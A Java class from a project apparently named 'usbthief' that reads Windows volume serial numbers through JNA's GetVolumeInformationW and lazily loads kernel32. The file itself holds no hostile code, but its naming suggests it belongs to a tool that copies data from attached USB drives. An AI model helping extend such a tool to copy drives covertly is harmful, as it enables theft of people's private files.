package com.superredrock.usbthief.platform.win;

import com.superredrock.usbthief.core.VolumeInfoProvider;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.ptr.IntByReference;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Windows implementation of {@link VolumeInfoProvider} backed by {@code GetVolumeInformationW}.
 *
 * <p>Moved verbatim out of {@code core.DeviceUtils} (AR-12). Unlike the old static helper, the
 * {@code kernel32} handle is resolved lazily on first use, so loading this class never touches a
 * native library; that only happens when {@link #getVolumeSerial(String)} actually runs on a
 * Windows host.</p>
 */
public class WindowsVolumeInfoProvider implements VolumeInfoProvider {

    protected static final Logger logger = LogManager.getLogger(WindowsVolumeInfoProvider.class);

    /**
     * Lazily resolved kernel32 handle.
     *
     * <p>Resolved on first use instead of in the static initializer: on a non-Windows host JNA
     * cannot load {@code kernel32} at all, and failing class initialization made every caller
     * (including the copy path, which only needs {@code DeviceUtils.getPath}) throw
     * {@code UnsatisfiedLinkError}.</p>
     */
    private static volatile Kernel32 kernel32Handle;
    private static volatile boolean kernel32Unavailable;

    // Maximum length for volume name and filesystem name buffers
    private static final int MAX_VOLUME_NAME_SIZE = 256;
    private static final int MAX_FILESYSTEM_NAME_SIZE = 256;

    /**
     * Returns the kernel32 handle, or {@code null} when the platform has no such library.
     *
     * @return JNA kernel32 instance or {@code null}
     */
    private static Kernel32 kernel32Instance() {
        if (kernel32Unavailable) {
            return null;
        }
        Kernel32 handle = kernel32Handle;
        if (handle != null) {
            return handle;
        }
        synchronized (WindowsVolumeInfoProvider.class) {
            if (kernel32Unavailable) {
                return null;
            }
            if (kernel32Handle != null) {
                return kernel32Handle;
            }
            try {
                kernel32Handle = Kernel32.INSTANCE;
            } catch (Throwable t) {
                // Non-Windows host or JNA unavailable: volume serial lookups degrade to "".
                kernel32Unavailable = true;
                logger.debug("kernel32 unavailable, volume serial lookups disabled: {}", t.toString());
                return null;
            }
            return kernel32Handle;
        }
    }

    /**
     * Gets volume serial number for a drive using JNA (Windows API).
     *
     * <p>Uses {@code GetVolumeInformationW} for efficient retrieval without
     * spawning external processes. Results are cached for performance.
     *
     * @param drive drive letter (e.g., "E:" or "E:\\\")
     * @return volume serial number, or empty string if retrieval fails
     */
    @Override
    public String getVolumeSerial(String drive) {
        if (drive == null || drive.isEmpty()) {
            return "";
        }
        String normalizedDrive = normalizeDrivePath(drive);
        return getSerialNumberViaJna(normalizedDrive);
    }

    /**
     * Normalizes drive path to format required by Windows API.
     *
     * @param drive drive path (e.g., "E:", "E:\\", "E:/")
     * @return normalized path (e.g., "E:\\\")
     */
    private static String normalizeDrivePath(String drive) {
        String path = drive.trim();

        // Extract drive letter
        if (path.length() >= 2 && path.charAt(1) == ':') {
            path = path.substring(0, 2);
        } else if (path.length() == 1 && Character.isLetter(path.charAt(0))) {
            path = path.toUpperCase() + ":";
        }

        // Windows API requires trailing backslash
        if (!path.endsWith("\\")) {
            path = path + "\\";
        }

        return path;
    }

    /**
     * Gets serial number using JNA (Windows API).
     *
     * <p>Calls {@code GetVolumeInformationW} to retrieve the volume serial number
     * directly without spawning external processes.
     *
     * @param drivePath normalized drive path with trailing backslash (e.g., "E:\\\")
     * @return serial number or empty string if failed
     */
    private static String getSerialNumberViaJna(String drivePath) {
        Kernel32 kernel32 = kernel32Instance();
        if (kernel32 == null) {
            return "";
        }
        try {
            // Prepare buffers for API call
            char[] volumeNameBuffer = new char[MAX_VOLUME_NAME_SIZE];
            char[] filesystemNameBuffer = new char[MAX_FILESYSTEM_NAME_SIZE];
            IntByReference volumeSerialNumber = new IntByReference();
            IntByReference maximumComponentLength = new IntByReference();
            IntByReference filesystemFlags = new IntByReference();

            // Call Windows API
            boolean result = kernel32.GetVolumeInformation(
                drivePath,                          // lpRootPathName
                volumeNameBuffer,                   // lpVolumeNameBuffer
                volumeNameBuffer.length,            // nVolumeNameSize
                volumeSerialNumber,                 // lpVolumeSerialNumber
                maximumComponentLength,             // lpMaximumComponentLength
                filesystemFlags,                    // lpFileSystemFlags
                filesystemNameBuffer,               // lpFileSystemNameBuffer
                filesystemNameBuffer.length         // nFileSystemNameSize
            );

            if (!result) {
                int error = kernel32.GetLastError();
                logger.debug("GetVolumeInformation failed for {}, error: {}", drivePath, error);
                return "";
            }

            // Convert serial number to hex string (8 digits, zero-padded)
            int serial = volumeSerialNumber.getValue();
            String serialHex = String.format("%08X", serial);

            logger.debug("Got serial number via JNA for {}: {}", drivePath, serialHex);
            return serialHex;

        } catch (Exception e) {
            logger.debug("JNA method exception for drive {}: {}", drivePath, e);
            return "";
        }
    }
}
